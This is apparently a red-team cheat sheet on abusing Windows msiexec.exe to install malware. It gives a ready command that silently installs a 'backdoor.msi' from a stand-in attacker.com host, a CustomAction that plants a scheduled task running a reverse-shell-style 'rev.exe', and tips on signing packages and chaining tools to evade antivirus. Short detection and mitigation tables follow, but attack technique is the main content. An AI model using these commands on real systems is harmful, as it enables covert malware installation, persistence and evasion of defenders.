# 📦 Msiexec - Living Off the Land

**msiexec.exe** is the native Windows Installer tool used to install `.msi` packages — but attackers can weaponize it to **download and install remote malware silently**, often under the radar of traditional AV and EDR tools.

> ⚠️ Only use in a controlled red team or research lab environment.

---

## 🛠️ What It Does
- Installs `.msi` packages from local or remote sources
- Runs with elevated privileges (if accepted by UAC)
- Can execute custom actions (scripts, binaries) inside the MSI
- Supports silent install for no-prompt execution

---

## 💣 Common LotL msiexec Techniques

### 1. Install Remote Malicious MSI Silently
```cmd
msiexec /i http://attacker.com/backdoor.msi /quiet /qn /norestart
```
✅ Downloads and installs malware over HTTP with no user prompts

---

### 2. Local Stealth Install
```cmd
msiexec /i C:\Users\Public\payload.msi /quiet
```
✅ Runs MSI from local disk silently

---

### 3. Abuse with Signed Installer to Evade Detection
- Create or modify a valid MSI signed by a trusted publisher (or self-sign)
- Deliver payload inside `CustomAction` script
✅ Often bypasses default AV/EDR signatures

---

### 4. Create Scheduled Task from Inside MSI
```xml
<CustomAction Id="Persist" Execute="deferred" Return="check" Directory="TARGETDIR" ExeCommand="schtasks /create /tn 'Update' /tr 'C:\Users\Public\rev.exe' /sc minute /mo 15" />
```
✅ MSI runs a hidden persistence script when installed

---

### 5. Run with Logging for Debug (or Staging)
```cmd
msiexec /i stage.msi /quiet /log stage-log.txt
```
✅ Leaves log of install process — sometimes used in staged APT payloads

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| msiexec contacting external domains | Monitor command-line args + destination IPs |
| MSI installs from `Public`, `Temp`, or internet | Flag rare install paths and remote sources |
| Rapid install → new autorun entries | Correlate with `reg.exe`, `schtasks`, or file creation

---

## 🔐 Mitigation Strategies
- Block outbound msiexec traffic if not used legitimately
- Alert on msiexec used with `/quiet` + external URLs
- Use Group Policy to restrict MSI execution to signed or approved packages
- Monitor scheduled tasks or registry entries created post-MSI install

---

> 🧠 Msiexec is stealthy, signed, and often overlooked. Combine it with BITS, certutil, or schtasks to make a malware chain nearly invisible to AV.
